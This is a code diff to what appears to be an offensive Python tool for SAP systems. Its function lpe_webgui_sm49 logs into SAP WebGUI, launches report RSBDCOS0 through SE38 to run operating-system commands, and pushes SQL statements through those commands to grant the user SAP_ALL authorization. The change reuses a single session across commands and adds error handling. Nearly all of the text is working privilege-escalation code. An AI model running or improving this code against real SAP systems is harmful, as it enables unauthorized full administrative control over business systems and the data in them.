@@ -141,13 +141,22 @@ def _webgui_session(base_url: str, creds: Credentials, tcode: str):
            f"?sap-client={creds.client}&sap-language=EN"
            f"&~transaction={urllib.parse.quote(tcode)}")
 
-    r = session.get(url, timeout=20)
+    try:
+        r = session.get(url, timeout=20)
+    except Exception as e:
+        logger.debug(f"WebGUI GET failed: {e}")
+        print(f"[-] WebGUI connection failed: {e}")
+        return None, None, None, None
     if r.status_code != 200:
+        logger.debug(f"WebGUI GET status {r.status_code}: {r.text[:200]}")
+        print(f"[-] WebGUI returned HTTP {r.status_code}")
         return None, None, None, None
 
     fa = re.findall(r'action="([^"]+)"', r.text)
     m = re.findall(r'var moin\s*=\s*"([^"]+)"', r.text)
     if not fa or not m:
+        logger.debug(f"No form action or moin in WebGUI page ({len(r.text)} bytes)")
+        print(f"[-] WebGUI page has no form action (session limit reached?)")
         return None, None, None, None
 
     post_url = f"{base_url}{fa[0]}"
@@ -164,6 +173,8 @@ def _webgui_session(base_url: str, creds: Credentials, tcode: str):
         timeout=20,
     )
     if r2.status_code != 200:
+        logger.debug(f"WebGUI POST status {r2.status_code}")
+        print(f"[-] WebGUI roundtrip returned HTTP {r2.status_code}")
         return None, None, None, None
 
     m2 = re.findall(r"moin:'([^']+)'", r2.text)
@@ -317,8 +328,24 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
         return False
     print(f"[*] {len(sql_stmts)} SQL statements to execute for SAP_ALL")
 
-    # Execute each SQL via a fresh WebGUI session + SM49 okcode navigation
+    # Open ONE WebGUI session and reuse it for all commands.
+    # Between commands, use okcode to restart RSBDCOS0 in the same session.
+    print(f"[*] Opening WebGUI session...")
+    session, post_url, moin, text = _webgui_session(
+        base_url, creds,
+        "*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
+    )
+    if not session:
+        print("[-] Could not open WebGUI session")
+        return False
+    if "Execute OS Command" not in text:
+        print("[-] RSBDCOS0 screen not reached")
+        return False
+    print(f"[+] RSBDCOS0 ready")
+
+    field_sid = "wnd[0]/usr/txt[0,8]"
     executed = 0
+
     for i, sql in enumerate(sql_stmts):
         os_cmd = _build_os_command_for_sql(sql, db_type, sid, inst_nr)
         if not os_cmd:
@@ -327,11 +354,36 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
         print(f"[*] [{i+1}/{len(sql_stmts)}] SQL: {sql}")
         print(f"    CMD: {os_cmd}")
 
-        ok = _exec_os_command_via_webgui(base_url, creds, os_cmd)
-        if ok:
+        # Execute the command
+        moin, resp, ti = _webgui_batch(session, post_url, moin, [
+            {"post": f"value/{field_sid}", "content": os_cmd},
+            {"post": "vkey/0/ses[0]"},
+            {"get": "state/ur"},
+        ])
+
+        if "row affected" in resp or "rows affected" in resp:
+            executed += 1
+        elif ti and "Execute OS Command" in str(ti):
             executed += 1
         else:
             print(f"[-]   Command execution failed")
+            # Try to recover the session by re-opening RSBDCOS0 via okcode
+            moin, resp, ti = _webgui_okcode(
+                session, post_url, moin,
+                "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
+            )
+            continue
+
+        # After each command, restart RSBDCOS0 for the next one
+        # by navigating via okcode within the SAME session
+        if i < len(sql_stmts) - 1:
+            moin, resp, ti = _webgui_okcode(
+                session, post_url, moin,
+                "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
+            )
+            if "Execute OS Command" not in str(ti) + resp:
+                print("[-] Could not restart RSBDCOS0, stopping")
+                break
 
     print(f"[*] Executed {executed}/{len(sql_stmts)} SQL statements")
 
@@ -342,43 +394,6 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
     print(f"[!] Note: User {creds.username} may need to re-logon for the")
     print(f"    new authorizations to take effect (user buffer refresh).")
     return True
-
-
-def _exec_os_command_via_webgui(base_url: str, creds: Credentials,
-                                 os_cmd: str) -> bool:
-    """Execute a single OS command via WebGUI RSBDCOS0.
-
-    Opens a fresh WebGUI session with *SE38 RSBDCOS0 + DYNP_OKCODE=strt
-    (which auto-executes RSBDCOS0 and lands on its output/input screen),
-    then uses the batch/json ``value/`` operation to set the command in
-    the ABAP list text input field and presses Enter.
-    """
-    session, post_url, moin, text = _webgui_session(
-        base_url, creds,
-        "*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
-    )
-    if not session:
-        return False
-
-    if "Execute OS Command" not in text:
-        return False
-
-    # Set the command value in the ABAP list text field and press Enter
-    field_sid = "wnd[0]/usr/txt[0,8]"
-    moin, resp, ti = _webgui_batch(session, post_url, moin, [
-        {"post": f"value/{field_sid}", "content": os_cmd},
-        {"post": "vkey/0/ses[0]"},
-        {"get": "state/ur"},
-    ])
-
-    # Check for success indicators in the response
-    if "row affected" in resp or "rows affected" in resp:
-        return True
-    # If the command ran without errors, the title stays "Execute OS Command"
-    if ti and "Execute OS Command" in str(ti):
-        return True
-
-    return False
 
 
 # ===================================================================
